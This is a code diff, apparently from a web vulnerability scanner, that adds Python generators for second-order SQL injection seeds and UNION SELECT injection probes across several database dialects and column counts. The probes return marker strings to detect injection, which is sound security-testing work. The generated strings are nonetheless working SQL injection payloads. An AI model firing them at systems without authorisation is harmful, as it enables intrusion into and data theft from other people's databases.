@@ -125,6 +125,53 @@ def sqli_time_payloads(value: str, delay: int) -> list[tuple[str, str]]:
     ]
 
 
+# Second-order (stored) SQLi: a unique marker plus a lone quote. The marker lets us
+# correlate a seed with the page where it later surfaces; the quote breaks any query
+# that concatenates the stored value, so a DB error on a *different* page proves the
+# value flowed into SQL at a later use (second-order injection).
+SECOND_ORDER_SQLI_PREFIX = "pssqli"
+
+
+def stored_sqli_payload(token: str) -> str:
+    return f"{SECOND_ORDER_SQLI_PREFIX}{token}'"
+
+
+def stored_sqli_signal(token: str) -> str:
+    """The marker (without the quote) to look for on a sink page."""
+    return f"{SECOND_ORDER_SQLI_PREFIX}{token}"
+
+
+def sqli_union_payloads(value: str, token: str, max_cols: int = 6) -> list[tuple[str, str, str]]:
+    """
+    UNION-based exfiltration probes. Each tuple is (label, payload, expected_marker).
+
+    The marker is split and re-joined by the *database* (string concatenation), so the
+    joined token never appears in the request — if it appears in the response, the DB
+    executed our UNION SELECT and returned attacker-chosen data (proof of exfiltration).
+    Covers numeric/quoted contexts, the common concat operators, and a range of column
+    counts (a UNION must match the original SELECT's column count).
+    """
+    v = value if value not in (None, "") else "1"
+    half = max(1, len(token) // 2)
+    h1, h2 = token[:half], token[half:] or token
+    expected = h1 + h2
+    concats = [
+        ("pipe", f"'{h1}'||'{h2}'"),          # SQLite / PostgreSQL / Oracle
+        ("concat", f"CONCAT('{h1}','{h2}')"),  # MySQL
+        ("plus", f"'{h1}'+'{h2}'"),            # MS SQL Server
+    ]
+    out: list[tuple[str, str, str]] = []
+    for cols in range(1, max_cols + 1):
+        for cname, expr in concats:
+            select_list = ",".join([expr] + ["NULL"] * (cols - 1))
+            # numeric context, then single-quoted string context (both comment-terminated)
+            out.append((f"numeric-{cname}-{cols}col",
+                        f"{v} UNION SELECT {select_list}-- -", expected))
+            out.append((f"quote-{cname}-{cols}col",
+                        f"{v}' UNION SELECT {select_list}-- -", expected))
+    return out
+
+
 def xss_exec_payloads(token: str) -> list[str]:
     """Execution probes for the browser verifier, across common contexts."""
     cb = f"window.{EXEC_BINDING}"
